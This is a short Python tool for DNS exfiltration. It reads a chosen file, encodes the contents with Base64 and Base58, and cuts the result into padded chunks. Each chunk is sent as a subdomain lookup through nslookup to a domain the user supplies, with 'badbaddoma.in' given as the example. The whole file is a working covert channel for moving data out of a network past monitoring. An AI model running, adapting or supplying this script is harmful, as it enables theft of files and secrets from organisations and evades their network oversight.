import os, subprocess, time, base64, base58, math
from random import randrange


#################
# Basic Encoder #
# and Decoder   #
#################

def Base64Encoder(text):
	sample_string_bytes = text.encode('ascii')
  
	base64_bytes = base64.b64encode(sample_string_bytes) 
	base64_string = base64_bytes.decode('ascii')

	print('[+] Base64 encoded.')
	return base64_string

def Base58Encoder(text):
	print('[+] Base58 encoded.')
	return base58.b58encode(text)

def Base58Decoder(text):
	print('[+] Base58 decoded.')
	return base58.b58decode(text)

def Base64Decoder(text):
	#base64_bytes = text.encode('ascii')
  
	sample_string_bytes = base64.b64decode(text) 
	sample_string = sample_string_bytes.decode('ascii')

	print('[+] Base64 decoded.')
	return sample_string

##################
# Read from file #
##################

def ReadFrom(file):
	try:
		print('[+] Reading file.')
		with open(file, 'r') as r:
			return r.read()
	except FileNotFoundError:
		print(f'{file} was not found.')

##################
# Basic  Encrypt #
##################

def getRandom(line):
	return randrange(len(line))

def Encryptor(text):
	text_from = 'abcdefghijkmnopqrstuvwxyz'
	#rand = getRandom(text)

	rand_a = text_from[getRandom(text)]
	rand_b = text_from[getRandom(text)]
	rand_c = text_from[getRandom(text)]

	return rand_a + text + rand_b + rand_c

# Get filname from user input
fileAt = input('Filename: ')

# Your domain name
DOMAIN_NAME = ''
while DOMAIN_NAME == '':
	DOMAIN_NAME = input('Domain Name (Example: badbaddoma.in): ')

# Subdomains place holder
subdomain_holder = []

# All text from text file as plain text
plain_text = ReadFrom(fileAt)
if plain_text != None:
	encode_text = Base58Encoder(Base64Encoder(plain_text))

	# Approx. number of subdomains
	MAGIC_NUM = math.ceil(len(encode_text)/20)
	_NUM = 0

	# Subdomain filtering
	while _NUM < MAGIC_NUM:

		subdomain_holder.append(Encryptor(encode_text[0:20].decode('utf-8')))
		encode_text = encode_text[20::]
		_NUM += 1

	full_text = ''
	perFinish = 0
	input('Start transmitting... [PRESS ENTER KEY]')
	for subdomain in subdomain_holder:
		FQDN = subdomain + f'.{DOMAIN_NAME}'

		print(f"{perFinish/len(subdomain_holder)*100:.1f} %", end="\r")

		ret = subprocess.call( ['nslookup', FQDN], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
		time.sleep(0.30)

		full_text += subdomain[1:-2]

		perFinish += 1

print('Done.')
